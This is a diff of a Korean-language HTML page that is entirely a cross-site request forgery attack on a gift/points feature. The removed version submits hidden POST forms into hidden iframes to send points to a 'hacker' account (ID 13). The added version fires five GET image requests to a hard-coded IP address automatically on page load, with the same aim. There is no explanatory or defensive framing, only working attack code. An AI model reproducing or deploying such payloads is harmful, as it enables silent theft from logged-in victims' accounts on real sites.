@@ -1,250 +1,41 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>🎁 선물 자동 보내기</title>
-    <style>
-        body { 
-            font-family: Arial; 
-            padding: 30px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            text-align: center;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.8);
-            border: 3px solid #00ff00;
-            padding: 40px;
-            margin: 20px auto;
-            border-radius: 20px;
-            max-width: 800px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
-        }
-        .status {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 18px;
-        }
-        .attack-item {
-            background: rgba(255, 193, 7, 0.2);
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border-left: 4px solid #ffc107;
-        }
-        iframe { display: none !important; }
-        button {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            margin: 10px;
-        }
-        button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-    </style>
+    <title>🎯 GET 방식 CSRF</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🎯 CSRF 선물 공격 시스템</h1>
-        <h2>🚀 Same-Origin으로 보안 우회!</h2>
-        
-        <div id="status" class="status">
-            ⏳ 공격 준비 완료... 시작 대기 중
-        </div>
-        
-        <div id="attacks"></div>
-        <div id="results"></div>
-        
-        <!-- 수동 제어 버튼들 -->
-        <div style="margin: 20px 0;">
-            <button onclick="startAutoAttack()">🔥 자동 공격 시작</button>
-            <button onclick="singleAttack()">⚡ 단일 공격</button>
-            <button onclick="checkResults()">📊 결과 확인</button>
-        </div>
-    </div>
-
-    <!-- 숨겨진 공격 폼들 -->
-    <form id="form1" action="/profile.php?gift_to=13" method="POST" target="iframe1" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="coffee">
-        <input type="hidden" name="points" value="100">
-        <input type="hidden" name="message" value="자동공격1">
-    </form>
-
-    <form id="form2" action="/profile.php?gift_to=13" method="POST" target="iframe2" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="flower">
-        <input type="hidden" name="points" value="150">
-        <input type="hidden" name="message" value="자동공격2">
-    </form>
-
-    <form id="form3" action="/profile.php?gift_to=13" method="POST" target="iframe3" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="cake">
-        <input type="hidden" name="points" value="200">
-        <input type="hidden" name="message" value="자동공격3">
-    </form>
-
-    <form id="form4" action="/profile.php?gift_to=13" method="POST" target="iframe4" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="diamond">
-        <input type="hidden" name="points" value="250">
-        <input type="hidden" name="message" value="자동공격4">
-    </form>
-
-    <form id="form5" action="/profile.php?gift_to=13" method="POST" target="iframe5" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="coffee">
-        <input type="hidden" name="points" value="300">
-        <input type="hidden" name="message" value="자동공격5">
-    </form>
-
-    <!-- 숨겨진 iframe들 -->
-    <iframe name="iframe1" style="display:none;"></iframe>
-    <iframe name="iframe2" style="display:none;"></iframe>
-    <iframe name="iframe3" style="display:none;"></iframe>
-    <iframe name="iframe4" style="display:none;"></iframe>
-    <iframe name="iframe5" style="display:none;"></iframe>
-
+    <h1>🚀 GET 기반 CSRF 공격</h1>
+    <div id="status">공격 준비 중...</div>
+    
     <script>
         let attackCount = 0;
-        let totalAttacks = 5;
-        let isAttacking = false;
-
-        const attacks = [
-            {id: 'form1', type: 'coffee', points: 100, name: '커피'},
-            {id: 'form2', type: 'flower', points: 150, name: '꽃'},
-            {id: 'form3', type: 'cake', points: 200, name: '케이크'},
-            {id: 'form4', type: 'diamond', points: 250, name: '다이아몬드'},
-            {id: 'form5', type: 'coffee', points: 300, name: '프리미엄 커피'}
-        ];
-
-        function updateStatus(message) {
-            document.getElementById('status').innerHTML = message;
-        }
-
-        function updateAttacks() {
-            let html = '<h3>🎯 공격 진행상황:</h3>';
-            attacks.forEach((attack, index) => {
-                let status = '';
-                if (index < attackCount) status = ' ✅ 완료';
-                else if (index === attackCount && isAttacking) status = ' 🔄 진행중';
-                else status = ' ⏳ 대기';
-                
-                html += `<div class="attack-item">
-                    ${attack.name} 선물 (${attack.points}P) → hacker${status}
-                </div>`;
-            });
-            document.getElementById('attacks').innerHTML = html;
-        }
-
-        function updateResults() {
-            const totalPoints = attacks.slice(0, attackCount).reduce((sum, attack) => sum + attack.points, 0);
-            document.getElementById('results').innerHTML = `
-                <div class="status">
-                    <h3>📊 공격 결과</h3>
-                    <p><strong>완료된 공격:</strong> ${attackCount}/${totalAttacks}</p>
-                    <p><strong>전송된 포인트:</strong> ${totalPoints}P</p>
-                    <p><strong>대상:</strong> hacker (ID: 13)</p>
-                    <p><strong>공격 방식:</strong> Same-Origin CSRF</p>
-                </div>
-            `;
-        }
-
-        function executeAttack(index) {
-            if (index >= attacks.length) {
-                isAttacking = false;
-                updateStatus('🎉 모든 공격 완료! hacker 계정을 확인해보세요!');
-                return;
-            }
-
-            isAttacking = true;
-            const attack = attacks[index];
-            
-            updateStatus(`🚀 ${attack.name} 공격 실행 중... (${attack.points}P)`);
-            updateAttacks();
-            
-            // 폼 제출
-            document.getElementById(attack.id).submit();
-            
-            attackCount++;
-            updateAttacks();
-            updateResults();
-            
-            console.log(`[CSRF] ${attack.name} 공격 완료: ${attack.points}P → hacker`);
-            
-            // 2초 후 다음 공격
-            setTimeout(() => executeAttack(index + 1), 2000);
-        }
-
-        function startAutoAttack() {
-            if (isAttacking) {
-                updateStatus('⚠️ 이미 공격이 진행 중입니다!');
-                return;
-            }
-            
-            attackCount = 0;
-            updateStatus('🔥 자동 CSRF 공격 시작!');
-            updateAttacks();
-            updateResults();
-            
-            console.log('🎯 Same-Origin CSRF 공격 시작됨');
-            executeAttack(0);
-        }
-
-        function singleAttack() {
-            if (attackCount >= totalAttacks) {
-                updateStatus('⚠️ 모든 공격이 완료되었습니다!');
-                return;
-            }
-            
-            const attack = attacks[attackCount];
-            document.getElementById(attack.id).submit();
-            
-            attackCount++;
-            updateStatus(`⚡ ${attack.name} 단일 공격 완료! (${attack.points}P)`);
-            updateAttacks();
-            updateResults();
-            
-            console.log(`[단일 CSRF] ${attack.name}: ${attack.points}P → hacker`);
-        }
-
-        function checkResults() {
-            updateStatus('🔍 결과 확인 중...');
-            
-            // hacker 프로필 새 창으로 열기
-            window.open('/profile.php?user_id=13', 'hacker_check', 'width=800,height=600');
-            
+        
+        function getAttack(giftType, points, message, delay) {
             setTimeout(() => {
-                updateStatus('📊 hacker 프로필이 새 창에서 열렸습니다. 포인트 변화를 확인하세요!');
-            }, 1000);
+                // GET 방식 이미지 공격
+                const img = new Image();
+                img.src = `http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=${giftType}&points=${points}&message=${message}&gift_to=13&_=${Date.now()}`;
+                
+                img.onload = () => console.log(`✅ ${giftType} 공격 성공`);
+                img.onerror = () => console.log(`⚠️ ${giftType} 공격 시도됨 (에러 정상)`);
+                
+                attackCount++;
+                document.getElementById('status').innerHTML = `🚀 공격 ${attackCount}: ${giftType} (${points}P) 전송 완료!`;
+                
+            }, delay);
         }
-
-        // 초기화
-        window.addEventListener('load', function() {
-            updateAttacks();
-            updateResults();
+        
+        // 페이지 로드 시 자동 실행
+        window.onload = function() {
+            console.log('🎯 GET 방식 CSRF 공격 시작');
             
-            console.log('🎯 Same-Origin CSRF 공격 시스템 준비 완료');
-            console.log('📍 현재 도메인:', window.location.origin);
-            
-            // 자동 시작 (선택사항)
-            // setTimeout(startAutoAttack, 3000);
-        });
+            getAttack('coffee', 100, 'get공격1', 1000);
+            getAttack('flower', 150, 'get공격2', 3000);  
+            getAttack('cake', 200, 'get공격3', 5000);
+            getAttack('diamond', 250, 'get공격4', 7000);
+            getAttack('coffee', 300, 'get공격5', 9000);
+        };
     </script>
 </body>
 </html>
